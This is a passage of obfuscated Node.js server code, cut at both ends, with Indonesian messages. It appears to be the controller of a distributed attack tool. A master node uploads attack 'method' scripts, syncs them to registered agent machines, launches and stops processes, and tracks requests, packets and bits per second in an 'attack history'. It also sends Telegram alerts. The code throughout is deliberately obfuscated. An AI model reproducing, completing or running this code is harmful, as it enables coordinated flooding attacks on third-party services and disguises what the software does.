_0x5b4a3b[_0x20d8ea(0x273)](0x190)[_0x20d8ea(0x1b6)](_0x20d8ea(0x261));_0x5b4a3b[_0x20d8ea(0x1b0)](readMethods());}),app[_0x3567df(0x1fa)](_0x3567df(0x309),express[_0x3567df(0x1b0)](),(_0xc5a2b1,_0xf74f62)=>{const _0x20f677=_0x3567df;if(_0xc5a2b1[_0x20f677(0x2b4)]['key']!==apiKey)return _0xf74f62[_0x20f677(0x273)](0x190)['send'](_0x20f677(0x261));const {name:_0x4927d9,script:_0x48b4c2,args:_0x50884e}=_0xc5a2b1[_0x20f677(0x2bf)];if(!_0x4927d9||!_0x48b4c2||!Array[_0x20f677(0x257)](_0x50884e))return _0xf74f62['status'](0x190)[_0x20f677(0x1b6)](_0x20f677(0x1f8));const _0x38f20b=readMethods();_0x38f20b[_0x4927d9]={'script':_0x48b4c2,'args':_0x50884e},writeMethods(_0x38f20b),logActivity(_0x20f677(0x2f7),{'name':_0x4927d9,'script':_0x48b4c2,'args':_0x50884e}),_0xf74f62[_0x20f677(0x1b0)]({'message':_0x20f677(0x267),'name':_0x4927d9});}),app[_0x3567df(0x1bc)](_0x3567df(0x283),async(_0x36430a,_0x41d111)=>{const _0x3d43f2=_0x3567df;if(_0x36430a[_0x3d43f2(0x2b4)][_0x3d43f2(0x1f6)]!==apiKey)return _0x41d111['status'](0x190)[_0x3d43f2(0x1b6)](_0x3d43f2(0x261));const _0x3c3d73=readMethods(),_0x438e46=_0x36430a[_0x3d43f2(0x23e)][_0x3d43f2(0x21b)];if(!_0x3c3d73[_0x438e46])return _0x41d111[_0x3d43f2(0x273)](0x194)['send']('Method\x20tidak\x20ditemukan');const _0xc868fd=_0x3c3d73[_0x438e46][_0x3d43f2(0x34b)];delete _0x3c3d73[_0x438e46],writeMethods(_0x3c3d73),logActivity(_0x3d43f2(0x1d5),{'name':_0x438e46,'scriptFile':_0xc868fd});let _0x81f129=![];if(_0xc868fd){const _0x462a03=path[_0x3d43f2(0x2d6)](uploadDir,_0xc868fd);fs[_0x3d43f2(0x1ea)](_0x462a03)&&(fs[_0x3d43f2(0x274)](_0x462a03),_0x81f129=!![],logActivity(_0x3d43f2(0x1ef),{'scriptFile':_0xc868fd}));}let _0x2b33fa=[];NODE_TYPE===_0x3d43f2(0x1d4)&&AGENT_LIST&&AGENT_LIST[_0x3d43f2(0x1e7)]&&_0xc868fd&&(_0x2b33fa=await Promise[_0x3d43f2(0x2f5)](AGENT_LIST['map'](_0x406e5e=>axios[_0x3d43f2(0x1fa)](_0x406e5e[_0x3d43f2(0x25b)]+_0x3d43f2(0x289),{'key':AGENT_KEY,'filename':_0xc868fd})[_0x3d43f2(0x27b)](()=>({'agent':_0x406e5e,'status':_0x3d43f2(0x2e0)}))['catch'](_0x2f09d5=>({'agent':_0x406e5e,'status':'failed','error':_0x2f09d5[_0x3d43f2(0x1b2)]})))),logActivity(_0x3d43f2(0x2e3),{'scriptFile':_0xc868fd,'results':_0x2b33fa})),_0x41d111[_0x3d43f2(0x1b0)]({'message':_0x3d43f2(0x1ed),'name':_0x438e46,'fileDeleted':_0x81f129,'sync':_0x2b33fa});}),app[_0x3567df(0x2e4)](_0x3567df(0x2e5),(_0x3eae0e,_0xcd89f9)=>{const _0x269c79=_0x3567df,_0x2adb73=path[_0x269c79(0x2d6)](__dirname,_0x269c79(0x225));if(!fs['existsSync'](_0x2adb73))return _0xcd89f9['status'](0x194)[_0x269c79(0x1b6)](_0x269c79(0x20f));_0xcd89f9['download'](_0x2adb73);}),app[_0x3567df(0x2e4)](_0x3567df(0x1cb),(_0x142fae,_0x41f97b)=>{const _0x4d0282=_0x3567df;if(_0x142fae[_0x4d0282(0x2b4)][_0x4d0282(0x1f6)]!==apiKey)return _0x41f97b['status'](0x190)[_0x4d0282(0x1b6)](_0x4d0282(0x261));fs[_0x4d0282(0x2a1)](uploadDir,(_0x172ae5,_0x2f81f8)=>{const _0x1d0c9f=_0x4d0282;if(_0x172ae5)return _0x41f97b[_0x1d0c9f(0x273)](0x1f4)['send'](_0x1d0c9f(0x28f));const _0x56005d=_0x2f81f8['filter'](_0x2e6ab0=>!_0x2e6ab0[_0x1d0c9f(0x32e)]('.'))[_0x1d0c9f(0x27c)](_0x2c3731=>{const _0x4c9697=_0x1d0c9f,_0x2ec491=fs[_0x4c9697(0x2ad)](path[_0x4c9697(0x2d6)](uploadDir,_0x2c3731));return{'name':_0x2c3731,'size':_0x2ec491[_0x4c9697(0x291)],'mtime':_0x2ec491['mtime']};});_0x41f97b['json'](_0x56005d);});}),app[_0x3567df(0x1bc)]('/api/method-files/:filename',async(_0x581faa,_0x5ec987)=>{const _0x318b2a=_0x3567df;if(_0x581faa[_0x318b2a(0x2b4)]['key']!==apiKey)return _0x5ec987[_0x318b2a(0x273)](0x190)['send'](_0x318b2a(0x261));const _0x3191f6=_0x581faa[_0x318b2a(0x23e)][_0x318b2a(0x201)],_0x1332a8=path[_0x318b2a(0x2d6)](uploadDir,_0x3191f6);if(!fs[_0x318b2a(0x1ea)](_0x1332a8))return _0x5ec987['status'](0x194)[_0x318b2a(0x1b6)]('File\x20tidak\x20ditemukan');fs['unlinkSync'](_0x1332a8),logActivity(_0x318b2a(0x20b),{'file':_0x3191f6});if(NODE_TYPE===_0x318b2a(0x1d4)&&AGENT_LIST&&AGENT_LIST[_0x318b2a(0x1e7)]){const _0x5472ed=await Promise['all'](AGENT_LIST[_0x318b2a(0x27c)](_0x204835=>axios[_0x318b2a(0x1fa)](_0x204835[_0x318b2a(0x25b)]+_0x318b2a(0x289),{'key':AGENT_KEY,'filename':_0x3191f6})['then'](()=>({'agent':_0x204835,'status':_0x318b2a(0x2e0)}))[_0x318b2a(0x26f)](_0x285ef5=>({'agent':_0x204835,'status':_0x318b2a(0x1f1),'error':_0x285ef5[_0x318b2a(0x1b2)]}))));logActivity(_0x318b2a(0x2e3),{'filename':_0x3191f6,'results':_0x5472ed});}_0x5ec987[_0x318b2a(0x1b0)]({'message':'File\x20dihapus','file':_0x3191f6});}),app[_0x3567df(0x2e4)]('/api/method-files/download/:filename',(_0x3e4522,_0x43284c)=>{const _0x1ce08b=_0x3567df;if(_0x3e4522[_0x1ce08b(0x2b4)][_0x1ce08b(0x1f6)]!==apiKey)return _0x43284c[_0x1ce08b(0x273)](0x190)[_0x1ce08b(0x1b6)](_0x1ce08b(0x261));const _0x56a91d=_0x3e4522[_0x1ce08b(0x23e)][_0x1ce08b(0x201)],_0x54f43e=path[_0x1ce08b(0x2d6)](uploadDir,_0x56a91d);if(!fs[_0x1ce08b(0x1ea)](_0x54f43e))return _0x43284c['status'](0x194)[_0x1ce08b(0x1b6)](_0x1ce08b(0x237));_0x43284c[_0x1ce08b(0x1b4)](_0x54f43e);}),app[_0x3567df(0x1fa)](_0x3567df(0x29c),express[_0x3567df(0x1b0)](),(_0x2d2299,_0x10f0e7)=>{const _0x15c56f=_0x3567df,{oldName:_0x3d3952,newName:_0x27d2b2,key:_0x251bec}=_0x2d2299['body'];if(_0x251bec!==apiKey)return _0x10f0e7['status'](0x190)[_0x15c56f(0x1b6)]('API\x20key\x20tidak\x20valid');if(!_0x3d3952||!_0x27d2b2)return _0x10f0e7[_0x15c56f(0x273)](0x190)[_0x15c56f(0x1b6)](_0x15c56f(0x250));const _0x48265c=path[_0x15c56f(0x2d6)](uploadDir,_0x3d3952),_0x35cab6=path['join'](uploadDir,_0x27d2b2);if(!fs[_0x15c56f(0x1ea)](_0x48265c))return _0x10f0e7[_0x15c56f(0x273)](0x194)[_0x15c56f(0x1b6)](_0x15c56f(0x2de));if(fs[_0x15c56f(0x1ea)](_0x35cab6))return _0x10f0e7['status'](0x199)[_0x15c56f(0x1b6)](_0x15c56f(0x1c7));fs['renameSync'](_0x48265c,_0x35cab6),logActivity(_0x15c56f(0x243),{'from':_0x3d3952,'to':_0x27d2b2}),_0x10f0e7[_0x15c56f(0x1b0)]({'message':'Nama\x20file\x20berhasil\x20diubah','from':_0x3d3952,'to':_0x27d2b2});}),app[_0x3567df(0x221)](_0x3567df(0x2cf),(_0x30a806,_0x29d16a)=>{const _0x5b1da1=_0x3567df;if(_0x30a806[_0x5b1da1(0x2b4)][_0x5b1da1(0x1f6)]!==apiKey)return _0x29d16a['status'](0x190)['send'](_0x5b1da1(0x261));const _0x31ba10=_0x30a806[_0x5b1da1(0x23e)]['oldName'],{name:_0x19105f,script:_0x5450f7,args:_0x1b3b63}=_0x30a806['body'];if(!_0x19105f||!_0x5450f7||!Array['isArray'](_0x1b3b63))return _0x29d16a[_0x5b1da1(0x273)](0x190)[_0x5b1da1(0x1b6)](_0x5b1da1(0x1f8));const _0x24059a=readMethods();if(!_0x24059a[_0x31ba10])return _0x29d16a[_0x5b1da1(0x273)](0x194)[_0x5b1da1(0x1b6)](_0x5b1da1(0x2ea));_0x31ba10!==_0x19105f&&delete _0x24059a[_0x31ba10],_0x24059a[_0x19105f]={'script':_0x5450f7,'args':_0x1b3b63},writeMethods(_0x24059a),logActivity(_0x5b1da1(0x1c3),{'oldName':_0x31ba10,'newName':_0x19105f,'script':_0x5450f7,'args':_0x1b3b63}),_0x29d16a['json']({'message':_0x5b1da1(0x305),'name':_0x19105f});}),app[_0x3567df(0x1fa)](_0x3567df(0x289),express['json'](),(_0x418954,_0x5002a9)=>{const _0x250e38=_0x3567df,_0x254fc3=_0x418954['body'];if(_0x254fc3[_0x250e38(0x1f6)]!==AGENT_KEY)return _0x5002a9[_0x250e38(0x273)](0x190)[_0x250e38(0x1b6)](_0x250e38(0x261));const _0x26414a=_0x254fc3[_0x250e38(0x201)];if(!_0x26414a)return _0x5002a9[_0x250e38(0x273)](0x190)[_0x250e38(0x1b6)](_0x250e38(0x1f0));const _0x3c62d6=path[_0x250e38(0x2d6)](uploadDir,_0x26414a);if(!fs['existsSync'](_0x3c62d6))return _0x5002a9[_0x250e38(0x1b0)]({'message':_0x250e38(0x2be)});fs[_0x250e38(0x274)](_0x3c62d6),logActivity(_0x250e38(0x2a8),{'file':_0x26414a}),_0x5002a9[_0x250e38(0x1b0)]({'message':_0x250e38(0x1e6),'file':_0x26414a});}),app[_0x3567df(0x2e4)](_0x3567df(0x230),(_0x361fae,_0x5e79a4)=>{const _0x251a55=_0x3567df;if(_0x361fae[_0x251a55(0x2b4)][_0x251a55(0x1f6)]!==apiKey)return _0x5e79a4['status'](0x190)[_0x251a55(0x1b6)](_0x251a55(0x261));const _0xf46187=_0x361fae['params'][_0x251a55(0x201)],_0x51c047=path['join'](uploadDir,_0xf46187);if(!fs[_0x251a55(0x1ea)](_0x51c047))return _0x5e79a4['status'](0x194)['send'](_0x251a55(0x237));_0x5e79a4['type'](_0x251a55(0x1e1))[_0x251a55(0x1b6)](fs['readFileSync'](_0x51c047,_0x251a55(0x259)));}),app[_0x3567df(0x1fa)](_0x3567df(0x29e),express[_0x3567df(0x2cd)]({'type':_0x3567df(0x1ab),'limit':_0x3567df(0x284)}),async(_0x332d7e,_0x69e8d8)=>{const _0x552072=_0x3567df;if(_0x332d7e[_0x552072(0x2b4)][_0x552072(0x1f6)]!==apiKey)return _0x69e8d8[_0x552072(0x273)](0x190)[_0x552072(0x1b6)](_0x552072(0x261));const _0x39468b=_0x332d7e['params'][_0x552072(0x201)],_0x16aae8=path[_0x552072(0x2d6)](uploadDir,_0x39468b);if(!fs['existsSync'](_0x16aae8))return _0x69e8d8[_0x552072(0x273)](0x194)[_0x552072(0x1b6)](_0x552072(0x237));fs[_0x552072(0x29a)](_0x16aae8,_0x332d7e['body'],'utf8'),logActivity('EDIT_METHOD_FILE',{'file':_0x39468b});let _0x8717ae=[];if(NODE_TYPE==='master'&&AGENT_LIST&&AGENT_LIST[_0x552072(0x1e7)]){const _0x221cb4=require('form-data'),_0x10b0fb=require(_0x552072(0x266));_0x8717ae=await Promise[_0x552072(0x2f5)](AGENT_LIST[_0x552072(0x27c)](_0x1a5693=>{const _0x2732e4=_0x552072,_0x57ace1=new _0x221cb4();return _0x57ace1[_0x2732e4(0x29b)](_0x2732e4(0x1f6),AGENT_KEY),_0x57ace1['append'](_0x2732e4(0x348),fs['createReadStream'](_0x16aae8),_0x39468b),_0x10b0fb['post'](_0x1a5693[_0x2732e4(0x25b)]+_0x2732e4(0x2a5),_0x57ace1,{'headers':_0x57ace1[_0x2732e4(0x275)](),'timeout':0x2710})[_0x2732e4(0x27b)](_0x11b6e9=>({'agent':_0x1a5693,'status':_0x2732e4(0x2e0),'data':_0x11b6e9['data']}))[_0x2732e4(0x26f)](_0x7d0fdf=>({'agent':_0x1a5693,'status':_0x2732e4(0x1f1),'error':_0x7d0fdf['message']}));})),logActivity('SYNC_EDIT_METHOD_FILE',{'filename':_0x39468b,'syncResults':_0x8717ae});}_0x69e8d8[_0x552072(0x1b0)]({'message':_0x552072(0x33c),'file':_0x39468b,'sync':_0x8717ae});}),app['post'](_0x3567df(0x242),upload[_0x3567df(0x22b)]('file'),async(_0x28e5ab,_0x144c15)=>{const _0x411721=_0x3567df,_0x41b88d=_0x28e5ab['query'][_0x411721(0x1f6)]||_0x28e5ab[_0x411721(0x2bf)]['key'];if(_0x41b88d!==apiKey)return _0x144c15[_0x411721(0x273)](0x190)[_0x411721(0x1b6)](_0x411721(0x261));if(!_0x28e5ab[_0x411721(0x348)])return _0x144c15['status'](0x190)[_0x411721(0x1b6)](_0x411721(0x25e));const _0x510501=path[_0x411721(0x2d6)](uploadDir,_0x28e5ab[_0x411721(0x348)][_0x411721(0x201)]),_0x1c5135=fs['readFileSync'](_0x510501,_0x411721(0x259));for(const _0x5413ef of DANGEROUS_KEYWORDS){if(_0x1c5135[_0x411721(0x331)](_0x5413ef))return fs[_0x411721(0x274)](_0x510501),logActivity(_0x411721(0x345),{'file':_0x28e5ab['file'][_0x411721(0x201)],'keyword':_0x5413ef}),await sendTelegramPhoto(_0x411721(0x1ba)+(_0x411721(0x1b8)+escapeTelegram(_0x5413ef)+_0x411721(0x28a))+(_0x411721(0x1d8)+escapeTelegram(_0x28e5ab[_0x411721(0x348)][_0x411721(0x201)])+'`')),_0x144c15[_0x411721(0x273)](0x190)[_0x411721(0x1b6)](_0x411721(0x2f2)+_0x5413ef+'\x22)');}logActivity('UPLOAD_METHOD_FILE',{'file':_0x28e5ab[_0x411721(0x348)]['filename'],'size':_0x28e5ab[_0x411721(0x348)][_0x411721(0x291)]}),await sendTelegramPhoto(_0x411721(0x1bb)+('*Nama:*\x20`'+escapeTelegram(_0x28e5ab[_0x411721(0x348)][_0x411721(0x201)])+'`\x0a')+('*Ukuran:*\x20`'+_0x28e5ab[_0x411721(0x348)]['size']+_0x411721(0x256))),_0x144c15[_0x411721(0x1b0)]({'message':_0x411721(0x229),'fileName':_0x28e5ab[_0x411721(0x348)][_0x411721(0x201)],'path':_0x411721(0x33d)+_0x28e5ab['file'][_0x411721(0x201)]});}),app[_0x3567df(0x1fa)](_0x3567df(0x211),express[_0x3567df(0x1b0)](),(_0x1a6d9e,_0x3602d2)=>{const _0x618fb1=_0x3567df;if(NODE_TYPE!==_0x618fb1(0x1d4))return _0x3602d2[_0x618fb1(0x273)](0x193)['send']('Hanya\x20master!');const {name:_0x1312c1,url:_0x51caa6,agentKey:_0x14f7e5}=_0x1a6d9e[_0x618fb1(0x2bf)];if(!_0x1312c1||!_0x51caa6||_0x14f7e5!==AGENT_KEY)return _0x3602d2[_0x618fb1(0x273)](0x190)[_0x618fb1(0x1b6)]('Parameter\x20salah\x20atau\x20API\x20key\x20tidak\x20valid');loadAgents();if(AGENT_LIST[_0x618fb1(0x338)](_0x525ac7=>_0x525ac7[_0x618fb1(0x25b)]===_0x51caa6||_0x525ac7[_0x618fb1(0x21b)]===_0x1312c1))return _0x3602d2[_0x618fb1(0x1b0)]({'message':_0x618fb1(0x295),'agent':AGENT_LIST[_0x618fb1(0x23b)](_0x2d31a9=>_0x2d31a9['url']===_0x51caa6||_0x2d31a9[_0x618fb1(0x21b)]===_0x1312c1)});const _0x2bd19f={'name':_0x1312c1,'url':_0x51caa6,'enabled':!![],'auto':!![],'registeredAt':new Date()[_0x618fb1(0x1d2)]()};AGENT_LIST['push'](_0x2bd19f),saveAgents(),logActivity(_0x618fb1(0x2cc),_0x2bd19f),_0x3602d2['json']({'message':'Agent\x20terdaftar','agent':_0x2bd19f});}),app[_0x3567df(0x2e4)]('/api/agents',(_0x1fec94,_0x234a4c)=>{const _0x1354ef=_0x3567df;if(_0x1fec94[_0x1354ef(0x2b4)][_0x1354ef(0x1f6)]!==apiKey)return _0x234a4c['status'](0x190)[_0x1354ef(0x1b6)](_0x1354ef(0x261));loadAgents(),_0x234a4c[_0x1354ef(0x1b0)](AGENT_LIST);}),app['post'](_0x3567df(0x2c3),express[_0x3567df(0x1b0)](),(_0x98ea41,_0x106f84)=>{const _0x5ba527=_0x3567df;if(_0x98ea41[_0x5ba527(0x2b4)][_0x5ba527(0x1f6)]!==apiKey)return _0x106f84[_0x5ba527(0x273)](0x190)[_0x5ba527(0x1b6)](_0x5ba527(0x261));const {name:_0x4372f7,url:_0x308f4a}=_0x98ea41[_0x5ba527(0x2bf)];if(!_0x4372f7||!_0x308f4a)return _0x106f84['status'](0x190)['send'](_0x5ba527(0x2d3));loadAgents();if(AGENT_LIST['some'](_0x39ab38=>_0x39ab38[_0x5ba527(0x21b)]===_0x4372f7))return _0x106f84[_0x5ba527(0x273)](0x190)[_0x5ba527(0x1b6)]('Agent\x20dengan\x20nama\x20ini\x20sudah\x20ada');const _0x197f2b={'name':_0x4372f7,'url':_0x308f4a,'enabled':!![]};AGENT_LIST[_0x5ba527(0x342)](_0x197f2b),saveAgents(),logActivity('AGENT_ADDED',_0x197f2b),_0x106f84['json']({'message':_0x5ba527(0x244),'agent':_0x197f2b});}),app[_0x3567df(0x221)]('/api/agents/:name',express[_0x3567df(0x1b0)](),(_0x50e5b4,_0x30ff66)=>{const _0x2334f=_0x3567df;if(_0x50e5b4['query']['key']!==apiKey)return _0x30ff66[_0x2334f(0x273)](0x190)[_0x2334f(0x1b6)](_0x2334f(0x261));const _0x1d8045=_0x50e5b4[_0x2334f(0x23e)]['name'],{url:_0x3e5514,enabled:_0x5ec43a}=_0x50e5b4[_0x2334f(0x2bf)];loadAgents();const _0x41d5e5=AGENT_LIST[_0x2334f(0x28c)](_0x5aec79=>_0x5aec79[_0x2334f(0x21b)]===_0x1d8045);if(_0x41d5e5===-0x1)return _0x30ff66['status'](0x194)[_0x2334f(0x1b6)]('Agent\x20tidak\x20ditemukan');if(_0x3e5514!==undefined)AGENT_LIST[_0x41d5e5][_0x2334f(0x25b)]=_0x3e5514;if(_0x5ec43a!==undefined)AGENT_LIST[_0x41d5e5][_0x2334f(0x212)]=!!_0x5ec43a;saveAgents(),logActivity(_0x2334f(0x226),AGENT_LIST[_0x41d5e5]),_0x30ff66['json']({'message':_0x2334f(0x2fb),'agent':AGENT_LIST[_0x41d5e5]});}),app[_0x3567df(0x1bc)](_0x3567df(0x2d7),(_0x3d9f50,_0x5eab29)=>{const _0x441a04=_0x3567df;if(_0x3d9f50[_0x441a04(0x2b4)]['key']!==apiKey)return _0x5eab29[_0x441a04(0x273)](0x190)[_0x441a04(0x1b6)](_0x441a04(0x261));const _0x3daabd=_0x3d9f50[_0x441a04(0x23e)][_0x441a04(0x21b)];loadAgents();const _0x1de598=AGENT_LIST[_0x441a04(0x28c)](_0x8dd8af=>_0x8dd8af['name']===_0x3daabd);if(_0x1de598===-0x1)return _0x5eab29['status'](0x194)[_0x441a04(0x1b6)](_0x441a04(0x1fc));const _0x32f681=AGENT_LIST[_0x441a04(0x21e)](_0x1de598,0x1)[0x0];saveAgents(),logActivity('AGENT_DELETED',_0x32f681),_0x5eab29[_0x441a04(0x1b0)]({'message':_0x441a04(0x34c),'agent':_0x32f681});}),app[_0x3567df(0x2e4)](_0x3567df(0x2fe),(_0x1d0b3,_0x1c676c)=>{_0x1c676c['send']('\x0a\x20\x20\x20\x20<h2>Upload\x20File\x20Method</h2>\x0a\x20\x20\x20\x20<form\x20action=\x22/api/uploadmeth\x22\x20method=\x22post\x22\x20enctype=\x22multipart/form-data\x22>\x0a\x20\x20\x20\x20\x20\x20<label>API\x20Key:\x20<input\x20type=\x22text\x22\x20name=\x22key\x22\x20required\x20/></label><br/><br/>\x0a\x20\x20\x20\x20\x20\x20<label>Pilih\x20File:\x20<input\x20type=\x22file\x22\x20name=\x22file\x22\x20required\x20/></label><br/><br/>\x0a\x20\x20\x20\x20\x20\x20<button\x20type=\x22submit\x22>Upload</button>\x0a\x20\x20\x20\x20</form>\x0a\x20\x20');}),app[_0x3567df(0x2e4)](_0x3567df(0x241),async(_0x359d4f,_0x5d5d88)=>{const _0x4d51c9=_0x3567df;try{const _0x567bc7=_0x359d4f['query']['key'];if(_0x567bc7!==apiKey)return _0x5d5d88[_0x4d51c9(0x273)](0x190)[_0x4d51c9(0x1b6)](_0x4d51c9(0x261));if(NODE_TYPE===_0x4d51c9(0x1d4)){Object[_0x4d51c9(0x1dd)](activeProcesses)[_0x4d51c9(0x1df)](_0x5cb62b=>{const _0x3a11f9=_0x4d51c9;activeProcesses[_0x5cb62b]&&activeProcesses[_0x5cb62b]['ls']&&activeProcesses[_0x5cb62b]['ls'][_0x3a11f9(0x20c)](_0x3a11f9(0x2ba)),clearInterval(stats[_0x5cb62b]?.[_0x3a11f9(0x1ac)]),delete stats[_0x5cb62b],delete activeProcesses[_0x5cb62b],logActivity(_0x3a11f9(0x2dd),{'processId':_0x5cb62b,'isMaster':!![]}),broadcastWS({'type':_0x3a11f9(0x2fa),'processId':_0x5cb62b,'exitCode':_0x3a11f9(0x2cb)}),updateAttackHistory(_0x5cb62b,{'endTime':new Date()[_0x3a11f9(0x1d2)](),'status':'stopped','exitCode':_0x3a11f9(0x2cb)});});const _0x5d1581=AGENT_LIST[_0x4d51c9(0x27c)](_0x1b646b=>axios['get'](_0x1b646b[_0x4d51c9(0x25b)]+_0x4d51c9(0x241),{'params':{'key':AGENT_KEY},'timeout':0x1f40})['then'](_0x4a4504=>({'agent':_0x1b646b,'status':_0x4d51c9(0x2e0),'data':_0x4a4504[_0x4d51c9(0x271)]}))[_0x4d51c9(0x26f)](_0x38e5b8=>({'agent':_0x1b646b,'status':_0x4d51c9(0x1f1),'error':_0x38e5b8['message']||_0x38e5b8[_0x4d51c9(0x1c1)]()}))),_0x58e540=await Promise[_0x4d51c9(0x2f5)](_0x5d1581);return logActivity(_0x4d51c9(0x23f),{'results':_0x58e540}),await sendTelegramPhoto('üõë\x20*STOP\x20broadcast\x20ke\x20agents\x20&\x20master:*\x0a'+_0x58e540['map'](_0x513a51=>_0x4d51c9(0x2fc)+escapeTelegram(_0x513a51[_0x4d51c9(0x2dc)][_0x4d51c9(0x21b)]||_0x513a51[_0x4d51c9(0x2dc)][_0x4d51c9(0x25b)])+'`:\x20*'+_0x513a51[_0x4d51c9(0x273)]+'*')[_0x4d51c9(0x2d6)]('\x0a')),broadcastWS({'type':'all_stopped'}),_0x5d5d88[_0x4d51c9(0x1b0)]({'message':_0x4d51c9(0x202),'results':_0x58e540});}Object[_0x4d51c9(0x1dd)](activeProcesses)[_0x4d51c9(0x1df)](_0x19d25d=>{const _0x5cbc01=_0x4d51c9;activeProcesses[_0x19d25d]&&activeProcesses[_0x19d25d]['ls']&&activeProcesses[_0x19d25d]['ls'][_0x5cbc01(0x20c)](_0x5cbc01(0x2ba)),clearInterval(stats[_0x19d25d]?.['_interval']),delete stats[_0x19d25d],delete activeProcesses[_0x19d25d],logActivity(_0x5cbc01(0x2dd),{'processId':_0x19d25d}),broadcastWS({'type':_0x5cbc01(0x2fa),'processId':_0x19d25d,'exitCode':'stopped_by_user'}),updateAttackHistory(_0x19d25d,{'endTime':new Date()[_0x5cbc01(0x1d2)](),'status':'stopped','exitCode':_0x5cbc01(0x2cb)});}),_0x5d5d88[_0x4d51c9(0x1b6)](_0x4d51c9(0x2f3)),await sendTelegramPhoto(_0x4d51c9(0x337)),broadcastWS({'type':_0x4d51c9(0x27a)});}catch(_0x4c9894){logActivity(_0x4d51c9(0x254),{'error':_0x4c9894['toString']()}),_0x5d5d88[_0x4d51c9(0x273)](0x1f4)[_0x4d51c9(0x1b6)](_0x4d51c9(0x304));}}),app['delete'](_0x3567df(0x1c2),(_0x30c08b,_0x24c86d)=>{const _0x26748c=_0x3567df;if(_0x30c08b['query'][_0x26748c(0x1f6)]!==apiKey)return _0x24c86d[_0x26748c(0x273)](0x190)['send']('API\x20key\x20tidak\x20valid');fs[_0x26748c(0x29a)](historyPath,'[]',_0x26748c(0x259)),_0x24c86d[_0x26748c(0x1b6)](_0x26748c(0x2bc));}),app[_0x3567df(0x2e4)](_0x3567df(0x1de),(_0x2e9c40,_0xad603e)=>{const _0x5e7b10=_0x3567df,_0x1461a9=_0x2e9c40[_0x5e7b10(0x2b4)][_0x5e7b10(0x1f6)],_0x2bdb39=_0x2e9c40['params']['processId'],_0x1f6e09=NODE_TYPE===_0x5e7b10(0x1d4)?apiKey:AGENT_KEY;if(_0x1461a9!==_0x1f6e09)return _0xad603e['status'](0x190)[_0x5e7b10(0x1b6)]('API\x20key\x20tidak\x20valid');if(!activeProcesses[_0x2bdb39])return _0xad603e[_0x5e7b10(0x273)](0x194)['send']('Process\x20ID\x20tidak\x20ditemukan');try{activeProcesses[_0x2bdb39]['ls']&&activeProcesses[_0x2bdb39]['ls'][_0x5e7b10(0x20c)](_0x5e7b10(0x2ba)),clearInterval(stats[_0x2bdb39]?.[_0x5e7b10(0x1ac)]),delete stats[_0x2bdb39],delete activeProcesses[_0x2bdb39],logActivity(_0x5e7b10(0x251),{'processId':_0x2bdb39}),broadcastWS({'type':_0x5e7b10(0x2fa),'processId':_0x2bdb39,'exitCode':_0x5e7b10(0x2cb)}),updateAttackHistory(_0x2bdb39,{'endTime':new Date()['toISOString'](),'status':_0x5e7b10(0x1ec),'exitCode':'stopped_by_user'}),_0xad603e[_0x5e7b10(0x1b0)]({'message':_0x5e7b10(0x1e0),'processId':_0x2bdb39});}catch(_0x4b7ec1){_0xad603e[_0x5e7b10(0x273)](0x1f4)['send'](_0x5e7b10(0x1c0));}}),app[_0x3567df(0x2e4)](_0x3567df(0x276),async(_0x2891c7,_0x27c5cd)=>{const _0x4162f7=_0x3567df,_0x2eff8d=_0x2891c7['query']['key'];if(_0x2eff8d!==apiKey)return _0x27c5cd[_0x4162f7(0x273)](0x190)['send'](_0x4162f7(0x261));const _0x32fded={},_0x5e4178={};for(const _0x186891 in activeProcesses){const _0xe1a096=activeProcesses[_0x186891];_0x32fded[_0x186891]={'status':_0xe1a096[_0x4162f7(0x273)],'lastResponse':_0xe1a096[_0x4162f7(0x209)],'restartCount':_0xe1a096[_0x4162f7(0x238)]||0x0,'pid':_0xe1a096['ls']?.[_0x4162f7(0x203)],'script':_0xe1a096[_0x4162f7(0x26d)],'args':_0xe1a096[_0x4162f7(0x27d)],'rps':stats[_0x186891]?.[_0x4162f7(0x216)]||0x0,'pps':stats[_0x186891]?.[_0x4162f7(0x1bf)]||0x0,'bps':stats[_0x186891]?Number((stats[_0x186891][_0x4162f7(0x208)]/0xf4240)['toFixed'](0x2)):0x0,'cpuPercent':null,'memoryMB':null},_0xe1a096['ls']?.[_0x4162f7(0x203)]&&(_0x5e4178[_0x186891]=_0xe1a096['ls']['pid']);}try{if(Object['values'](_0x5e4178)[_0x4162f7(0x1e7)]>0x0){const _0x36a6ee=await pidusage(Object[_0x4162f7(0x346)](_0x5e4178));for(const [_0x17d90b,_0xf48b02]of Object[_0x4162f7(0x2e9)](_0x5e4178)){const _0x277a8b=_0x36a6ee[_0xf48b02];_0x277a8b&&_0x32fded[_0x17d90b]&&(_0x32fded[_0x17d90b][_0x4162f7(0x232)]=Number(_0x277a8b[_0x4162f7(0x327)][_0x4162f7(0x22a)](0x2)),_0x32fded[_0x17d90b]['memoryMB']=Math[_0x4162f7(0x28b)](_0x277a8b[_0x4162f7(0x31a)]/0x400/0x400));}}}catch(_0x3d6b93){}const _0x49fa82=os[_0x4162f7(0x2b0)]();let _0x109d3c=0x0,_0x53ce51=0x0;_0x49fa82[_0x4162f7(0x1df)](_0x3db7ca=>{const _0x24d09a=_0x4162f7;for(let _0x115c91 in _0x3db7ca[_0x24d09a(0x24d)]){_0x53ce51+=_0x3db7ca['times'][_0x115c91];}_0x109d3c+=_0x3db7ca[_0x24d09a(0x24d)]['idle'];});const _0x43f745=_0x109d3c/_0x49fa82[_0x4162f7(0x1e7)],_0x14e14a=_0x53ce51/_0x49fa82[_0x4162f7(0x1e7)],_0x156711=0x64-~~(0x64*_0x43f745/_0x14e14a),_0x3da834=os[_0x4162f7(0x311)](),_0x2a287d=os['freemem'](),_0x1a30f5=Math[_0x4162f7(0x28b)]((_0x3da834-_0x2a287d)/0x400/0x400),_0x551042=Math[_0x4162f7(0x28b)](_0x3da834/0x400/0x400);if(NODE_TYPE===_0x4162f7(0x1d4)){const _0x4a392e=AGENT_LIST[_0x4162f7(0x27c)](async _0x22da66=>{const _0x83eddf=_0x4162f7,_0x206d80=Date[_0x83eddf(0x23d)]();try{const _0x9c4931=await axios[_0x83eddf(0x2e4)](_0x22da66[_0x83eddf(0x25b)]+_0x83eddf(0x276),{'params':{'key':AGENT_KEY},'timeout':0x1f40}),_0x2393b9=Date[_0x83eddf(0x23d)]()-_0x206d80;return{'agent':_0x22da66,'status':_0x83eddf(0x2e0),'data':{..._0x9c4931[_0x83eddf(0x271)],'ping':_0x2393b9}};}catch(_0x59137e){return{'agent':_0x22da66,'status':_0x83eddf(0x1f1),'error':_0x59137e[_0x83eddf(0x1b2)]||_0x59137e['toString']()};}}),_0x375268=await 